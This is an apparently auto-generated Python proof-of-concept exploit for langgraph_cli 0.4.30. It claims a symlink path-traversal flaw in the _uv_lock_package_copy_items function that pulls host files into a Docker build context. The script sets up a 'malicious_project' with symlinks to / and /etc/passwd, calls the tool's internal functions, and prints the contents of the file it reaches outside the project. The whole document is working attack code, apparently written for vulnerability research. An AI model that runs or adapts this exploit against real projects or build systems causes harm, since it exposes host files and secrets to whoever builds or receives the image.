#!/usr/bin/env python3
# PoC for langgraph_cli-0.4.30 (/tmp/langgraph_cli-0.4.30)
# Path: suspicious-022
# Sink: _uv_lock_package_copy_items
# Auto-generated — run with: python3 lfi_docker_build_context__uv_lock_package_copy_items.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for LFI in langgraph_cli-0.4.30
Vulnerability: Path traversal via symlinks in _uv_lock_package_copy_items
Allows including arbitrary files from the host filesystem into Docker build context

This PoC demonstrates the vulnerability by creating a symlink that points outside
the project root, causing the Docker build to include /etc/passwd in the image.
"""

import os
import sys
import json
import shutil
import tempfile
import subprocess
import pathlib
from typing import Dict, Any

# Configuration
TARGET_DIR = "/tmp/langgraph_cli-0.4.30"
WORK_DIR = tempfile.mkdtemp(prefix="langgraph_poc_")
PAYLOAD_FILE = "/etc/passwd"  # Benign file to demonstrate LFI

def setup_exploit_environment() -> Dict[str, Any]:
    """Create a malicious project structure with symlink traversal"""
    
    # Create project root
    project_root = pathlib.Path(WORK_DIR) / "malicious_project"
    project_root.mkdir(parents=True, exist_ok=True)
    
    # Create a symlink that points outside the project root
    # This simulates an attacker-controlled workspace member path
    symlink_target = project_root / "external_files"
    os.symlink("/", symlink_target)  # Symlink to root filesystem
    
    # Create a workspace member that uses the symlink
    workspace_member = project_root / "packages" / "evil_package"
    workspace_member.mkdir(parents=True, exist_ok=True)
    
    # Create a symlink inside the workspace member pointing to sensitive file
    sensitive_link = workspace_member / "sensitive_data"
    os.symlink(PAYLOAD_FILE, sensitive_link)
    
    # Create pyproject.toml for the workspace
    pyproject_content = """
[project]
name = "evil-package"
version = "0.1.0"
requires-python = ">=3.8"

[tool.uv.workspace]
members = ["packages/*"]
"""
    (project_root / "pyproject.toml").write_text(pyproject_content)
    
    # Create uv.lock file (minimal)
    uv_lock_content = {
        "version": 1,
        "packages": [],
        "workspace": {
            "members": ["packages/*"]
        }
    }
    (project_root / "uv.lock").write_text(json.dumps(uv_lock_content))
    
    # Create a config file that points to our malicious project
    config = {
        "dependencies": ["."],
        "python_version": "3.11",
        "source": {
            "kind": "uv"
        },
        "graphs": {
            "test_graph": {
                "path": "./packages/evil_package/sensitive_data"
            }
        }
    }
    
    config_path = project_root / "langgraph.json"
    config_path.write_text(json.dumps(config, indent=2))
    
    return {
        "project_root": project_root,
        "config_path": config_path,
        "symlink_target": symlink_target,
        "workspace_member": workspace_member,
        "sensitive_link": sensitive_link
    }

def trigger_vulnerability(env: Dict[str, Any]) -> None:
    """Trigger the LFI by running the vulnerable function"""
    
    # Change to the project directory
    original_cwd = os.getcwd()
    os.chdir(env["project_root"])
    
    try:
        # Import the vulnerable module
        sys.path.insert(0, TARGET_DIR)
        from langgraph_cli.uv_lock import (
            _plan_uv_lock_workspace,
            _build_ignore_spec,
            _uv_lock_package_copy_items
        )
        from langgraph_cli.config import validate_config_file
        
        # Load the malicious config
        config = validate_config_file(env["config_path"])
        
        # Plan the workspace (this processes the symlink)
        plan = _plan_uv_lock_workspace(env["config_path"], config)
        
        # Build ignore spec (won't catch symlinks)
        ignore_spec = _build_ignore_spec(plan.project_root, include_gitignore=False)
        
        print("[*] Project root:", plan.project_root)
        print("[*] Workspace members:", plan.all_workspace_roots)
        
        # Iterate over packages and trigger the vulnerable function
        for package in plan.install_order:
            print(f"\n[*] Processing package: {package.name}")
            print(f"[*] Package root: {package.root}")
            
            # This is where the vulnerability manifests
            copy_items = _uv_lock_package_copy_items(package, plan, ignore_spec)
            
            for source, destination in copy_items:
                print(f"[*] Copy item: {source} -> {destination}")
                
                # Check if we're copying from outside the project root
                source_path = plan.project_root / pathlib.Path(str(source))
                if source_path.is_symlink():
                    real_path = os.path.realpath(source_path)
                    print(f"[!] SYMLINK DETECTED: {source_path} -> {real_path}")
                    
                    # Verify the symlink points outside project root
                    try:
                        source_path.relative_to(plan.project_root)
                        print(f"[!] Symlink appears inside project root (relative path)")
                    except ValueError:
                        print(f"[!] Symlink points OUTSIDE project root - LFI confirmed!")
                    
                    # Check if we can read the target file
                    if os.path.exists(real_path):
                        print(f"[+] Successfully accessed: {real_path}")
                        with open(real_path, 'r') as f:
                            content = f.read()[:200]  # First 200 chars
                            print(f"[+] File content preview: {content}")
        
        print("\n[+] Vulnerability successfully triggered!")
        print("[+] The Docker build context would now include files from outside the project root")
        
    except Exception as e:
        print(f"[-] Error during exploitation: {e}")
        import traceback
        traceback.print_exc()
    finally:
        os.chdir(original_cwd)

def cleanup(env: Dict[str, Any]) -> None:
    """Clean up the temporary directory"""
    try:
        shutil.rmtree(WORK_DIR)
        print(f"[*] Cleaned up {WORK_DIR}")
    except Exception as e:
        print(f"[-] Cleanup error: {e}")

def main():
    """Main exploit function"""
    print("=" * 60)
    print("LFI Proof-of-Concept for langgraph_cli-0.4.30")
    print("=" * 60)
    
    # Check if target directory exists
    if not os.path.exists(TARGET_DIR):
        print(f"[-] Target directory {TARGET_DIR} not found!")
        print("[*] Please ensure langgraph_cli-0.4.30 is installed at the specified path")
        sys.exit(1)
    
    print(f"[*] Target: {TARGET_DIR}")
    print(f"[*] Work directory: {WORK_DIR}")
    print(f"[*] Payload file: {PAYLOAD_FILE}")
    print()
    
    # Setup exploit environment
    print("[*] Setting up malicious project structure...")
    env = setup_exploit_environment()
    print(f"[*] Project root: {env['project_root']}")
    print(f"[*] Symlink target: {env['symlink_target']}")
    print(f"[*] Sensitive link: {env['sensitive_link']}")
    print()
    
    # Trigger the vulnerability
    print("[*] Triggering vulnerability...")
    trigger_vulnerability(env)
    
    # Cleanup
    print("\n[*] Cleaning up...")
    cleanup(env)
    
    print("\n[*] Exploit complete!")

if __name__ == "__main__":
    main()
